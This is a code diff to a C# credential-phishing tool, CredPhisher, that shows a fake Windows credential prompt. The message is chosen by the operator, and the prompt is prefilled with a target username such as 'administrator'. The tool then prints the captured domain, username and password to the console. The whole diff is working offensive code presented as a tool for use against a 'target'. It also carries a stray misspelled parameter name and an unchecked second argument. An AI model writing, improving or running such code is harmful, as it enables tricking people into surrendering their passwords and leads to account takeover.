@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -37,28 +37,38 @@ namespace CredPhisher
             ref uint authPackage,
             IntPtr InAuthBuffer,
             uint InAuthBufferSize,
-            out IntPtr refOutAuthBuffer,
+            out IntPtr refOutAuthBucffer,
             out uint refOutAuthBufferSize,
             ref bool fSave,
             int flags);
 
-        public static void Collector(string message, out NetworkCredential networkCredential)
+        [DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        private static extern Boolean CredPackAuthenticationBuffer(int dwFlags,
+            string pszUserName,
+            string pszPassword,
+            IntPtr pPackedCredentials,
+            ref int pcbPackedCredentials);
+
+        public static void Collector(string message, string name, out NetworkCredential networkCredential)
         {
             CREDUI_INFO credui = new CREDUI_INFO();
             //This block collects the current username and prompts them. This is easily modifiable.
-            string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            string username = name;
             credui.pszCaptionText = message;
-            credui.pszMessageText = "Please enter the credentials for " + username;
+            credui.pszMessageText = "Please enter your credentials.";
             credui.cbSize = Marshal.SizeOf(credui);
             uint authPackage = 0;
             IntPtr outCredBuffer = new IntPtr();
+            int inCredSize = 1024;
+            IntPtr inCredBuffer = Marshal.AllocCoTaskMem(inCredSize);
+            CredPackAuthenticationBuffer(0, username, "", inCredBuffer, ref inCredSize);
             uint outCredSize;
             bool save = false;
             int result = CredUIPromptForWindowsCredentials(ref credui,
                 0,
                 ref authPackage,
-                IntPtr.Zero,
-                0,
+                inCredBuffer,
+                (uint) inCredSize,
                 out outCredBuffer,
                 out outCredSize,
                 ref save,
@@ -79,7 +89,7 @@ namespace CredPhisher
                     CoTaskMemFree(outCredBuffer);
                     networkCredential = new NetworkCredential()
                     {
-                        UserName = usernameBuf.ToString(),
+                        UserName = username,
                         Password = passwordBuf.ToString(),
                         Domain = domainBuf.ToString()
                     };
@@ -91,18 +101,20 @@ namespace CredPhisher
 
         static void Main(string[] args)
         {
-            if (args.Length == 0){
-                Console.WriteLine("[-] Please supply the message that will be displayed to the target (ex. 'Windows has lost connection to Outlook')");
+            if (args.Length == 0)
+            {
+                Console.WriteLine("[-] Please supply the message that will be displayed to the target (ex. 'Windows has lost connection to Outlook') and username.");
+                Console.WriteLine("[-] CredPhisher.exe 'Message' 'administrator'");
                 return;
             }
             try
             {
-                Collector(args[0], out NetworkCredential networkCredential);
+                Collector(args[0], args[1], out NetworkCredential networkCredential);
                 Console.WriteLine("[+] Collected Credentials:\r\n" +
                     "Username: " + networkCredential.Domain + "\\" + networkCredential.UserName + "\r\n" +
                     "Password: " + networkCredential.Password);
             }
-            catch (NullReferenceException) 
+            catch (NullReferenceException)
             {
                 Console.WriteLine("[-] User exited prompt");
             }
@@ -110,7 +122,7 @@ namespace CredPhisher
             {
                 Console.WriteLine("[-] Looks like something went wrong...");
             }
-            
+
         }
     }
 }
